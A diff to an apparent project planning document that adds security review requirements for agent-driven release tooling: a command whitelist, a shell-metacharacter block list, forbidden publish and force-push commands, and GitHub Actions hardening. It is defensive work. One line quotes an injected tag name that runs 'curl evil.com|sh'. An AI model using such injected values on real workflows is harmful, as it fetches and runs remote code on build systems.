@@ -87,6 +87,47 @@ Note: corpus-scope-relevance protocol was added to the rule MID-bootstrap (commi
 - Gate 9 changing its number/position in /merge-ready
 - Pre-push hook in opt-out projects (only opt-in via .claude/rules/auto-release.md sentinel)
 
+## Phase 1.5 security pre-review findings (binding MUSTs for implementer agents)
+
+### Slice 1 (release-engineer executing-mode + bash whitelist) — APPROVED with 8 MUSTs
+- **M1 anchored regex correctness** — every whitelist regex MUST start with `^` and end with `$`. No `.` (use `\.` for literal dots). Test fixtures must include zero-byte input, leading-whitespace input, trailing-newline input, and embedded-NUL input — all must REJECT.
+- **M2 metacharacter rejection BEFORE regex match** — pre-filter rejects any input containing `;`, `&&`, `||`, `|`, `` ` ``, `$(`, `>`, `<`, `\` (backslash), or newline (`\n`, `\r`). This pre-filter runs FIRST, before the anchored-regex tier match. A whitelist regex that incidentally matches a string containing these metacharacters MUST still reject due to the pre-filter.
+- **M3 tier-table no-default-allow** — every command falls through to a literal `Forbidden` default if it does not match any Trivial/Moderate/Sensitive regex. There is no implicit allow-list; the `match → tier` mapping is closed.
+- **M4 tag-scheme disambiguation uses `git merge-base HEAD origin/main` not `HEAD~1`** — disambiguation logic computes the merge-base of HEAD against origin/main, then `git diff --name-only <merge-base>..HEAD` to enumerate changed files. Naive `HEAD~1` breaks on squash-merge or fast-forward histories where the previous commit is on the SAME feature branch.
+- **M5 headless primitive parity with resource-architect** — env var `AUTO_RELEASE=1` skips Sensitive-tier confirmation prompts. Detection primitive matches resource-architect's `AUTO_INSTALL=1` and Section 7 FR-7.4 headless contract: `process.stdin.isTTY === false` OR `[ -t 0 ]` returns false OR `AUTO_RELEASE=1` is set. Same primitive, same semantics, no drift.
+- **M6 sentinel-absent §6 byte-for-byte preservation** — when `.claude/rules/auto-release.md` is ABSENT in the consuming project, release-engineer Gate 9 §6 (the entire executing-mode body) MUST be skipped silent no-op; the sentinel-absent path renders byte-identical to current main's suggest-only Gate 9.
+- **M7 NEVER list relocations are explicit not silent** — the FORBIDDEN tier list (`npm publish`, `cargo publish`, `pypi upload`, `gh release create`, any `--force` flag, any `git push --force-with-lease`) is enumerated in the agent prompt verbatim, not derived from a "default deny what's not Sensitive" rule. Reviewers can grep for each forbidden symbol.
+- **M8 settings.json allowlist is Slice 6 not Slice 1** — Slice 1 only adds the agent's authority-tier dispatch; the matching `~/.claude/settings.json` allow entry for `~/.claude/tools/sdlc-knowledge/sdlc-knowledge release *` (or whatever symbol the binary exposes) is registered by `install.sh --bootstrap-release` in Slice 6. Slice 1 must NOT touch settings.json.
+
+New test cases: TC-SEC-1.5 through TC-SEC-1.13 (9 cases) cover the regex/metacharacter/tier-table/disambiguation/headless/sentinel-absent matrix.
+
+### Slice 2 (install.sh REPO_URL fix + Windows uname branch) — APPROVED with 1 MEDIUM
+- **MEDIUM curl/wget hardening parity** — install.sh:376 (knowledge binary curl) currently lacks `--max-redirs 5 --max-time 120`. install.sh:382 (wget fallback) lacks `--max-redirect=5 --timeout=120`. The pdfium download path at install.sh:545 already has both. Slice 2 adds these flags to the knowledge-binary path for defense-in-depth parity. Mitigates redirect-loop DoS and infinite-stall scenarios on attacker-controlled or dead URLs.
+
+### Slice 4 (sdlc-core-release.yml workflow) — PASS with 3 mandatory implementation requirements
+- **M5a CRITICAL `git archive` honors `.gitattributes export-ignore`, NOT `.gitignore`** — the source tarball MUST exclude `.claude/`, `books/`, test fixtures, and any locally-ingested `index.db`. Add a `.gitattributes` file at repo root with `export-ignore` entries for each excluded path, OR add a pre-archive assertion step (`git ls-files | grep -E '^(\.claude/|books/|.*index\.db$)'` returning empty) that fails the workflow if violated. `.gitignore` alone is INSUFFICIENT — `git archive` ignores it by design.
+- **M5c HIGH shell injection via `${{ github.ref* }}` expressions in run blocks** — never directly interpolate `${{ github.ref_name }}`, `${{ github.ref }}`, `${{ github.event.* }}` into a `run:` shell command. Assign to env vars first via `env:` block, then reference as `$ENV_VAR` in the shell. Otherwise a maliciously-named tag (`v1.0.0$(curl evil.com|sh)`) executes arbitrary code in the workflow.
+- **A1 HIGH version v-prefix stripping** — when extracting the version from `${{ github.ref_name }}` (which arrives as `v1.0.0`), use `VERSION="${GITHUB_REF_NAME#v}"` in a shell step (after assigning `GITHUB_REF_NAME` via env). Do NOT rely on substring/regex inside the GHA expression syntax.
+
+### Slice 6 (install.sh --bootstrap-release) — FAIL-pending until 10 MUSTs verbatim
+- **M1 opt-in flag** — flag is `--bootstrap-release` (long form only, no short alias). Default is OFF; the bootstrap path runs only when explicitly passed.
+- **M2 7-part pre-condition gate** — before any tag-creating action, ALL must pass:
+  1. `git status --porcelain` returns empty (clean working tree)
+  2. `git rev-parse --abbrev-ref HEAD` returns `main`
+  3. `git remote get-url origin` matches `https://github.com/codefather-labs/claude-code-sdlc(\.git)?$` exactly
+  4. Cargo.toml `version =` line matches the `--bootstrap-release` argument
+  5. No existing tag with that version locally (`git tag -l <tag>` empty) AND no existing tag remotely (`git ls-remote --tags origin <tag>` empty)
+  6. `gh auth status` exits 0
+  7. The release-notes file `.claude/release-notes-<version>.md` exists and is non-empty
+- **M3 NEW argument sanitization regex** — the version argument MUST match `^[0-9]+\.[0-9]+\.[0-9]+$` exactly. Reject pre-release suffixes (`1.0.0-rc.1`), build metadata (`1.0.0+abc`), v-prefix (`v1.0.0`), and any leading/trailing whitespace.
+- **M4 confirmation prompt with literal `[y/N]` (NOT `[yes/N]`)** — the prompt string is exactly `Push tag <tag> to origin? [y/N] `. Default-deny on empty input, anything other than literal `y` or `Y`. Match resource-architect's prompt grammar.
+- **M5 headless contract layered on top of pre-conditions** — when `AUTO_RELEASE=1` is set, M2 pre-conditions still run; only the M4 prompt is skipped (auto-confirm). Pre-condition failures still abort.
+- **M6 atomic rollback on push failure** — if `git push origin <tag>` fails after `git tag -a <tag>` succeeded locally, immediately run `git tag -d <tag>` to restore prior state. Do NOT leave a half-applied tag.
+- **M7 idempotency on re-run** — re-running `--bootstrap-release <same-version>` after a successful push detects the existing remote tag (M2.5) and exits 0 with a `[BOOTSTRAP] tag <tag> already exists; nothing to do` log line.
+- **M8 NEVER `--force`** — no `--force`, `--force-with-lease`, or `+refs/tags/...:refs/tags/...` syntax. Tag pushes are non-destructive only.
+- **M9 `[BOOTSTRAP]` audit-trail logging** — every git command (the eventual `git tag -a` and `git push origin`) is preceded by a stderr line `[BOOTSTRAP] running: <command>`. The literal `[BOOTSTRAP]` prefix lets reviewers grep audit logs.
+- **M10 error-message hygiene** — abort messages MUST NOT include raw `git remote get-url origin` output, raw `gh auth status` output, or any token fragments. Use canonical sanitized messages: `pre-condition failed: origin URL mismatch (expected codefather-labs/claude-code-sdlc)`, `pre-condition failed: gh CLI not authenticated`, etc.
+
 ## Completed
 (none — implementation pending)
 
